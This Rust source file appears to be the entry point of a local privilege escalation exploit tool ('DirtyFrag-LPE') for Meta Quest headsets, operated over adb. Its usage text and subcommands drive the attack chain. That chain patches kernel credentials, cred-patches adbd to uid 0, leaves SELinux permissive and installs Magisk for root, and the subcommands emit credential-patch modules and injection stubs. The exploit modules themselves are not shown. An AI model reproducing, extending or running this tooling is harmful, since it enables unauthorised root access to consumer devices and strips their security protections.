mod asm;
mod aes;
mod json;
mod elf;
mod emit;
mod credmod;
mod log;
mod target;
mod adb;
mod assets;
mod orchestrate;

use std::fs;
use orchestrate::Cleanup;
use target::Target;

fn die(m: &str) -> ! { eprintln!("error: {}", m); std::process::exit(1); }
fn i64a(s: &str) -> i64 {
    let s = s.trim();
    if let Some(h) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        i64::from_str_radix(h, 16).or_else(|_| u64::from_str_radix(h, 16).map(|u| u as i64))
            .unwrap_or_else(|_| die(&format!("bad hex {}", s)))
    } else { s.parse().unwrap_or_else(|_| die(&format!("bad int {}", s))) }
}

const USAGE: &str = "\
DirtyFrag-LPE orchestrator (Quest 3 / 3S / Pro / 2; target-driven; single binary, no clang)

usage: fuguquest -t targets/<name>.json [options]
  -t, --target <file>   target JSON (required)
  -d, --device <serial> adb serial (default: match target build_incremental)
  --no-restore          leave device fully poisoned & permissive
  --leave-disabled      revert code poisons (shell, no reboot), keep Permissive (for post-ex)
  --postex              after Permissive: root via insmod_sh -> Singularity Magisk -> setenforce 1
  --adb-root            no Magisk: cred-patch adbd to uid0+caps+kernel ctx, leave Permissive
  --skip-magisk         post-ex without the Magisk step
  --verify-root         use su to confirm poison/module (validation only)
  --settle <sec>        ctor settle after restart, seconds (fractional ok, e.g. 0.5; default 0.3)

  (default cleanup, if none of the above: reboot to restore Enforcing)

validation/dev subcommands: emit-credmod emit-credpatch emit-carrier emit-cfg emit-libas emit-stub test-aes";

fn run_cli(a: &[String]) {
    let mut target: Option<String> = None;
    let mut device: Option<String> = None;
    let mut cleanup = Cleanup::Reboot;
    let mut skip_magisk = false;
    let mut verify_root = false;
    let mut settle_ms: u64 = 300;
    let mut i = 1;
    while i < a.len() {
        match a[i].as_str() {
            "-t" | "--target" => { i += 1; target = Some(a.get(i).unwrap_or_else(|| die("missing target")).clone()); }
            "-d" | "--device" => { i += 1; device = Some(a.get(i).unwrap_or_else(|| die("missing device")).clone()); }
            "--no-restore" => cleanup = Cleanup::NoRestore,
            "--leave-disabled" => cleanup = Cleanup::LeaveDisabled,
            "--postex" => cleanup = Cleanup::Postex,
            "--adb-root" => cleanup = Cleanup::AdbRoot,
            "--skip-magisk" => skip_magisk = true,
            "--verify-root" => verify_root = true,
            "--settle" => { i += 1; let s = a.get(i).unwrap_or_else(|| die("missing settle")); settle_ms = (s.parse::<f64>().unwrap_or_else(|_| die("bad settle")) * 1000.0) as u64; }
            "-h" | "--help" => { println!("{}", USAGE); return; }
            other => die(&format!("unknown arg {}", other)),
        }
        i += 1;
    }
    let target = target.unwrap_or_else(|| { eprintln!("{}", USAGE); die("missing -t/--target"); });
    log::init();
    let t = Target::load(&target);
    orchestrate::run(&t, device.as_deref(), cleanup, verify_root, settle_ms, skip_magisk);
}

fn main() {
    let a: Vec<String> = std::env::args().collect();
    if a.len() < 2 { eprintln!("{}", USAGE); std::process::exit(2); }
    match a[1].as_str() {
        "emit-credmod" => {
            let carrier = fs::read(&a[2]).unwrap_or_else(|e| die(&format!("read {}: {}", a[2], e)));
            let enf = if a.len() > 9 { i64a(&a[9]) as u32 } else { 0 };
            let cred = if a.len() > 10 { i64a(&a[10]) as u32 } else { 0x778 };
            let csec = if a.len() > 11 { Some(i64a(&a[11]) as u32) } else { None };
            let (out, msg) = credmod::build_credmod(carrier, i64a(&a[4]), i64a(&a[5]), i64a(&a[6]),
                i64a(&a[7]), i64a(&a[8]), enf, cred, csec).unwrap_or_else(|e| die(&e));
            fs::write(&a[3], &out).unwrap_or_else(|e| die(&format!("write: {}", e)));
            println!("{}: {}", a[3], msg);
        }
        "emit-credpatch" => {
            let csec = if a.len() > 10 { Some(i64a(&a[10]) as u32) } else { None };
            let (p, anchor) = emit::cred_patch(i64a(&a[3]), i64a(&a[4]), i64a(&a[5]), i64a(&a[6]),
                i64a(&a[7]), i64a(&a[8]) as u32, i64a(&a[9]) as u32, csec);
            fs::write(&a[2], &p).unwrap();
            eprintln!("wrote {} bytes anchor@0x{:x}", p.len(), anchor);
        }
        "emit-carrier" => {
            let carrier = fs::read(&a[2]).unwrap();
            let out = credmod::build_carrier(carrier, i64a(&a[4]) as u64, i64a(&a[5]) as u32).unwrap_or_else(|e| die(&e));
            fs::write(&a[3], &out).unwrap();
            eprintln!("carrier written {} bytes", out.len());
        }
        "emit-cfg" => {
            let orig = fs::read(&a[2]).unwrap();
            let (_o, patched) = credmod::build_cfg(orig, &a[4], i64a(&a[5]) as usize, i64a(&a[6]) as usize).unwrap_or_else(|e| die(&e));
            fs::write(&a[3], &patched).unwrap();
            eprintln!("cfg written {} bytes", patched.len());
        }
        "emit-libas" => {
            let (raw, _spec) = emit::build_libas_stub(&a[2], &a[3], 0, 4096).unwrap_or_else(|e| die(&e));
            fs::write(&a[4], &raw).unwrap();
            eprintln!("libas stub {} bytes", raw.len());
        }
        "emit-stub" => {
            let mut files = Vec::new();
            let mut i = 11;
            while i + 3 <= a.len() {
                files.push((a[i].clone(), fs::read(&a[i+1]).unwrap(), fs::read(&a[i+2]).unwrap()));
                i += 3;
            }
            let (raw, spec, cnts) = emit::build_inject_stub(
                i64a(&a[4]) as u32, i64a(&a[5]) as u8, i64a(&a[6]) as u16,
                i64a(&a[7]) as u64, i64a(&a[8]) as usize, i64a(&a[9]) as u64, i64a(&a[10]) as u64,
                &files).unwrap_or_else(|e| die(&e));
            fs::write(&a[2], &raw).unwrap();
            fs::write(&a[3], &spec).unwrap();
            eprintln!("stub {} bytes cnts={:?}", raw.len(), cnts);
        }
        "test-aes" => {
            let kb = i64a(&a[2]) as u8;
            let ks = aes::keystream0(kb);
            for iv_hex in &a[3..] {
                let mut iv = [0u8; 8];
                for i in 0..8 { iv[i] = u8::from_str_radix(&iv_hex[i*2..i*2+2], 16).unwrap(); }
                println!("{:02x}", ks(&iv));
            }
        }
        _ => run_cli(&a),
    }
}
